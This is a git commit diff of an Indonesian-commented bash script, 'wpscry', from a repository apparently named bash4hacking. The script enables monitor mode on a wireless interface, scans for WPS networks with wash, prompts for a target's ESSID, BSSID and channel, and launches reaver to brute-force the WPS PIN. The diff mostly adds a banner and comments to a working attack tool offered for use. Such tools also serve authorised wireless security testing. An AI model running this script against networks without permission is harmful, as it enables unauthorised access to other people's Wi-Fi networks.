0725be40fdafd60ba4da8d099d0635f64c5783cd
bgropay <bgropay@gmail.com>
2024-08-04 19:27:11 +0700

    Add files via upload

--- wpscry/wpscry.sh
+++ wpscry/wpscry.sh
@@ -1,10 +1,32 @@
 #!/bin/bash
+#---------------------------------------------------------------------------------------------------------------------
+#  __        __  ____    ____     ____   ____   __   __
+#  \ \      / / |  _ \  / ___|   / ___| |  _ \  \ \ / /
+#   \ \ /\ / /  | |_) | \___ \  | |     | |_) |  \ V / 
+#    \ V  V /   |  __/   ___) | | |___  |  _ <    | |  
+#     \_/\_/    |_|     |____/   \____| |_| \_\   |_| 
+#---------------------------------------------------------------------------------------------------------------------
+# [+] wpscry
+#     wpscry adalah sebuah script bash sederhana yang dirancang untuk melakukan serangan terhadap jaringan Wi-Fi yang menggunakan fitur WPS (Wi-Fi Protected Setup) dengan alat reaver.
 #
-# wpscry
+# [+] Pembuat
+#     - Ropay
+# 
+# [+] Github
+#     https://github.com/bgropay/bash4hacking.git
 #
-# wpscry adalah sebuah script bash sederhana untuk melakukan serangan terhadap pin wps menggunkaan wash dan reaver.
+# [+] daftar alat yang diperlukan:
+#     - airmon-ng
+#     - iwconfig
+#     - wash
+#     - reaver
 #
+# [+]  Cara menjalankannya:
+#      1. chmod +x wpscry.sh
+#      2. ./wpscry.sh
+#---------------------------------------------------------------------------------------------------------------------
 
+# fungsi untuk mengecek root
 function cek_root(){
 	if [[ "$EUID" -ne 0 ]]; then
 		echo "[-] Script ini harus dijalankan sebagi root."
@@ -12,6 +34,7 @@ function cek_root(){
 	fi
 }
 
+# fungsi untuk mengatur interface yang ingin digunakan
 function mengatur_interface(){
 	while true; do
 		read -p "Interface: " interface
@@ -30,6 +53,7 @@ function mengatur_interface(){
 	done
 }
 
+# fungsi untuk mengaktifkan mode monitor pada interface yang sudah diatur
 function mengaktifkan_mode_monitor(){
 		if iwconfig "${interface}" 2>/dev/null | grep -q -w "Mode:Monitor"; then
 			echo "[+] Interface ${interface} sudah dalam mode monitor."
@@ -58,15 +82,17 @@ function mengaktifkan_mode_monitor(){
 		
 }
 
+# fungsi untuk memindai jaringan wps menggunakan alat wash
 function memindai_jaringan_wps(){
 	echo "[*] Memindai jaringan WPS (Tekan CTRL+C untuk menghentikan pemindaian)..."
 	echo ""
 	wash -i "${interface}"
 }
 
+# fungsi untuk mengatur target yang ingin di serang
 function mengatur_target(){
 
-	# mengatur essid
+	# mengatur essid target
 	while true; do
 		read -p "ESSID: " essid
 		if [[ ! -z "${essid}" ]]; then
@@ -78,7 +104,7 @@ function mengatur_target(){
 		fi
 	done
 
-	# mengatur bssid
+	# mengatur bssid target
 	while  true; do
 		read -p "BSSID: " bssid
 		if [[ ! -z "${bssid}" ]]; then
@@ -95,7 +121,7 @@ function mengatur_target(){
 		fi
 	done
 
-	# mengatur channel
+	# mengatur channel target
 	while true; do
 		read -p "Channel: " channel
 		if [[ ! -z "${channel}" ]]; then
@@ -114,10 +140,12 @@ function mengatur_target(){
 	read -p "Tekan [Enter] untuk memulai serangan..."
 }
 
+# fungsi untuk melakukan serangan terhadap target yang sudah diatur
 function menjalankan_serangan(){
 	reaver -i "${interface}" -c "${channel}" -b "${bssid}"
 }
 
+# fungsi utama wpscry
 function wpscry(){
 	cek_root
 	mengatur_interface
